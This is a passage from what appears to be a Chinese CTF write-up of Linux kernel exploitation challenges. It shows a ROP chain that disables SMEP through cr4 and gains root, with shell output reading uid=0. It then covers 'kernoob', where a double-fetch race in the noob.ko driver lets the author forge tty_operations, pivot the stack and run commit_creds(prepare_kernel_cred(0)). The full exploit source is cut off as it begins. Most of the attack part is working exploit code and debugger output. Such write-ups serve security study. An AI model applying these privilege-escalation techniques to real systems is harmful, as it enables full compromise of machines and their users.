class="number">0x80001000</span>);</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">40</span>;</span><br><span class="line">    rop[i++] = canary;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = pop_rdi;</span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = mov_rc4_pop_ret;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop[i++] = swapgs;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = iretq_ret;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,rop);</span><br><span class="line">    <span class="comment">//rop[i++] = </span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*]canary:0x8e9280f76a472054</span><br><span class="line">[*] commit_cred: 0xffffffff810a1430</span><br><span class="line">[*] prepare_kernel_cred : 0xffffffff810a1820</span><br><span class="line">suceess</span><br><span class="line">/home/pwn # id</span><br><span class="line">uid=0(root) gid=0</span><br><span class="line">/home/pwn #</span><br></pre></td></tr></table></figure><h2 id="2-kernoob"><a href="#2-kernoob" class="headerlink" title="2.kernoob"></a>2.kernoob</h2><h4 id="go-1"><a href="#go-1" class="headerlink" title="go"></a>go</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bzImage</span><br><span class="line">initramfs.cpio</span><br><span class="line">noob.ko</span><br><span class="line">startvm.sh</span><br></pre></td></tr></table></figure><p>startvm.sh</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">stty intr ^]</span><br><span class="line">cd `dirname $0`</span><br><span class="line">timeout --foreground 600 qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &apos;console=ttyS0 loglevel=3 pti=off oops=panic panic=1 nokaslr&apos; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp 2,cores=2,threads=1 \</span><br><span class="line">    -cpu qemu64,smep 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>开了smep，没开nokaslr<br>smep 只有改cr4就可以绕过<br>比赛的时候有个师傅说是double fetch，然后我就想不出是哪里double fetch，后来看到一位师傅的博客讲到三种情况的 double fetch<br>下面引用师傅说的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、Shallow Copy</span><br><span class="line">这种数据传递通常是结构体类型的变量传递，结构体中包含了指针，当把这个数据传递进内核时，只是得到了结构体的数据，也就是浅拷贝，如果对结构体中的指针验证过后使用之前，恶意线程修改了这个指针，便是绕过了验证</span><br><span class="line">2、Type Selection</span><br><span class="line">第一次传递根据header决定数据类型，根据不同类型来接受第二次传递，在这之间修改了数据，则造成数据与类型不匹配，如cxgb3 main.c中的一段代码</span><br><span class="line">3、Size Checking</span><br><span class="line">第一次传递根据header获取size，申请对应大小的buf，第二次传递接受数据存入buf</span><br><span class="line"> for ----Mask 师傅</span><br></pre></td></tr></table></figure><p>这次比赛的类型就是就跟第三种类似</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> 1 <span class="comment">#!/bin/sh</span></span><br><span class="line"> 2 </span><br><span class="line"> 3 <span class="built_in">echo</span> <span class="string">"Welcome :)"</span></span><br><span class="line"> 4 </span><br><span class="line"> 5 mount -t proc none /proc</span><br><span class="line"> 6 mount -t devtmpfs none /dev</span><br><span class="line"> 7 mkdir /dev/pts</span><br><span class="line"> 8 mount /dev/pts</span><br><span class="line"> 9 </span><br><span class="line">10 insmod /home/pwn/noob.ko</span><br><span class="line">11 chmod 666 /dev/noob</span><br><span class="line">12 </span><br><span class="line">13 <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">14 <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">15 </span><br><span class="line">16 <span class="built_in">cd</span> /home/pwn</span><br><span class="line">17 setsid /bin/cttyhack setuidgid 0 sh</span><br><span class="line">18 </span><br><span class="line">19 umount /proc</span><br><span class="line">20 poweroff -f</span><br></pre></td></tr></table></figure><p>内核加载了noob.ko驱动 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __usercall add_note@&lt;rax&gt;(__int64 a1@&lt;rbp&gt;, <span class="keyword">unsigned</span> __int64 *a2@&lt;rdi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp-20h] [rbp-20h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a2);</span><br><span class="line">  v3 = *a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2[<span class="number">2</span>] &gt; <span class="number">0x70</span> || a2[<span class="number">2</span>] &lt;= <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">0x1F</span> || *((_QWORD *)&amp;pool + <span class="number">2</span> * v3) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  v4 = _kmalloc(a2[<span class="number">2</span>], <span class="number">0x14000C0</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  *((_QWORD *)&amp;pool + <span class="number">2</span> * v3) = v4;</span><br><span class="line">  qword_BC8[<span class="number">2</span> * v3] = a2[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里在判断 size 和分配size是分开来判断的,如果这时候判断size完了，然后有另一个线程出现，然后修改<br>size，那是不是就可以分配到我们想要分配到的size，在kernel中存在一种tty_struct结构，大小是0x2e0。<br>利用有个 tty_operations 结构体，利用来很多函数，这也许就是传说中的风水地。<br>如果能修改其中一个或者劫持掉，那岂不是可以执行rop了<br>但是执行rop需要在知道栈的地址，那我们是不是可以先mmap一个可以执行内存，然后跳到这里来。<br>劫持 函数的时候要 利用寄存器中的值，和esp的值来实现<br>然后 需要把rop复制到开辟的栈上<br>然后smep 跟上面一样<br>然后就是getshell</p><h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn # lsmod</span><br><span class="line">noob 16384 0 - Live 0xffffffffc0002000 (OE)</span><br></pre></td></tr></table></figure><p>首先，先malloc到我们想要的size的chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">char</span> *buf2 = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">  save_status();</span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">int</span> fd  = open(<span class="string">"/dev/noob"</span>,O_RDONLY);</span><br><span class="line">  <span class="keyword">pthread_t</span> t1;</span><br><span class="line">  pthread_create(&amp;t1,<span class="literal">NULL</span>,change,&amp;buf[<span class="number">2</span>]);</span><br><span class="line">  buf[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">  buf[<span class="number">2</span>]=<span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100000</span>;i++)</span><br><span class="line">  &#123;   </span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">      ioctl(fd,<span class="number">0x30000</span>,buf);</span><br><span class="line">  &#125;</span><br><span class="line">  fff=<span class="number">0</span>;</span><br><span class="line">  pthread_join(t1,<span class="literal">NULL</span>);</span><br><span class="line">  ioctl(fd,<span class="number">0x30001</span>,buf);</span><br></pre></td></tr></table></figure><p>然后就能malloc到 我们想要的chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0xffffffffc00044c0</span><br><span class="line">0xffffffffc00044c0:0xffff8800058a6c000x00000000000002e0</span><br><span class="line">0xffffffffc00044d0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>那之后就是伪造 tty_operations</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *(*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *, <span class="title">struct</span> <span class="title">file</span> *, <span class="title">int</span>);</span> <span class="comment">/*     0     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*install)(struct tty_driver *, struct tty_struct *);              <span class="comment">/*     8     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *, struct tty_struct *);              <span class="comment">/*    16     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*open)(struct tty_struct *, struct file *);                       <span class="comment">/*    24     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct *, struct file *);                     <span class="comment">/*    32     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *);                                 <span class="comment">/*    40     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *);                                  <span class="comment">/*    48     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*write)(struct tty_struct *, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">int</span>);         <span class="comment">/*    56     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">    <span class="keyword">int</span> (*put_char)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">char</span>);                            <span class="comment">/*    64     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *);                                       <span class="comment">/*    72     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*write_room)(struct tty_struct *);                                         <span class="comment">/*    80     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*chars_in_buffer)(struct tty_struct *);                                    <span class="comment">/*    88     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*ioctl)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>);             <span class="comment">/*    96     8 */</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">int</span> <span class="params">(*compat_ioctl)</span><span class="params">(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)</span></span>; <span class="comment">/*   104     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *, struct ktermios *);                    <span class="comment">/*   112     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct *);                                          <span class="comment">/*   120     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 2 boundary (128 bytes) --- */</span></span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct *);           <span class="comment">/*   128     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *);                 <span class="comment">/*   136     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *);                <span class="comment">/*   144     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *);               <span class="comment">/*   152     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *, <span class="keyword">int</span>);        <span class="comment">/*   160     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *);         <span class="comment">/*   168     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *);            <span class="comment">/*   176     8 */</span></span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *, <span class="keyword">int</span>); <span class="comment">/*   184     8 */</span></span><br><span class="line">    <span class="comment">/* --- cacheline 3 boundary (192 bytes) --- */</span></span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *, <span class="keyword">char</span>);                           <span class="comment">/*   192     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *);                                    <span class="comment">/*   200     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);        <span class="comment">/*   208     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *, struct winsize *);                    <span class="comment">/*   216     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *, struct termiox *);               <span class="comment">/*   224     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); <span class="comment">/*   232     8 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span>                                 <span class="comment">/*   240     8 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* size: 248, cachelines: 4, members: 31 */</span></span><br><span class="line">    <span class="comment">/* last cacheline: 56 bytes */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>修改ioctl 为我们的转移栈的地址 我们可以利用xchg eax，esp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">RAX  0xffffffff8101db17 ◂— xchg   eax, esp /* 0x63be0025394cc394 */</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x6e23a0 ◂— 0</span><br><span class="line"> RDX  0x0</span><br><span class="line"> RDI  0xffff8800058a6c00 ◂— add    dword ptr [rax + rax], edx /* 0x100005401 */</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0xffffabf2</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x0</span><br><span class="line"> R12  0xffff8800058a6c00 ◂— add    dword ptr [rax + rax], edx /* 0x100005401 */</span><br><span class="line"> R13  0x0</span><br><span class="line"> R14  0xffff880005874c00 ◂— 0</span><br><span class="line"> R15  0xffff8800058a6400 ◂— add    dword ptr [rax + rax], edx /* 0x100005401 */</span><br><span class="line"> RBP  0xffffc9000024fe60 —▸ 0xffffc9000024fee8 —▸ 0xffffc9000024ff28 —▸ 0xffffc9000024ff48 ◂— 0</span><br><span class="line"> RSP  0xffffc9000024fdb0 —▸ 0xffffffff815d0786 ◂— 0xae850ffffffdfd3d</span><br><span class="line"> RIP  0xffffffff8101db17 ◂— xchg   eax, esp /* 0x63be0025394cc394 */</span><br></pre></td></tr></table></figure><p>然后就将栈转移到了 0x8101db17</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp  0x8101db17 —▸ 0xffffffff813f6c9d ◂— pop    rdi /* 0x40478b480080c35f */</span><br><span class="line">01:0008│      0x8101db1f ◂— 0x6f0</span><br><span class="line">02:0010│      0x8101db27 —▸ 0xffffffff81069b14 ◂— 0x801f0fc35de7220f</span><br><span class="line">03:0018│      0x8101db2f ◂— 0</span><br><span class="line">04:0020│      0x8101db37 —▸ 0x400a4c ◂— 0xec834853e5894855</span><br><span class="line">05:0028│      0x8101db3f ◂— 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   0xffffffff8101db17    xchg   eax, esp</span><br><span class="line"> ► 0xffffffff8101db18    ret    &lt;0xffffffff813f6c9d&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xffffffff813f6c9d    pop    rdi</span><br><span class="line">   0xffffffff813f6c9e    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0xffffffff81069b14    mov    cr4, rdi</span><br><span class="line">   0xffffffff81069b17    pop    rbp</span><br><span class="line">   0xffffffff81069b18    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x400a4c              push   rbp</span><br><span class="line">   0x400a4d              mov    rbp, rsp</span><br><span class="line">   0x400a50              push   rbx</span><br><span class="line">   0x400a51              sub    rsp, 8</span><br></pre></td></tr></table></figure><p>剩下就跟上面差不多就是写rop，绕过smep，再执行commit_creds(prepare_kernel_cred(0)); 然后getshell<br>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="comment">//#define commit_cred  0xffffffff810a1430</span></span><br><span class="line"><span class="comment">//#define prepare_kernel_cred  0xffffffff810a1820</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (*_commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (*_prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">int</span> spray_fd[<span class="number">0x100</span>];</span><br><span class="line"><span class="keyword">size_t</span> buf[<span class="number">3</span>] =&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *(*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *, <span class="title">struct</span> <span class="title">file</span> *, <span class="title">int</span>);</span> <span class="comment">/*     0     8 */</span></span><br><span class="line">    <span class="keyword">int</span> (*install)(struct tty_driver *, struct tty_struct *);              <span class="comment">/*     8     8 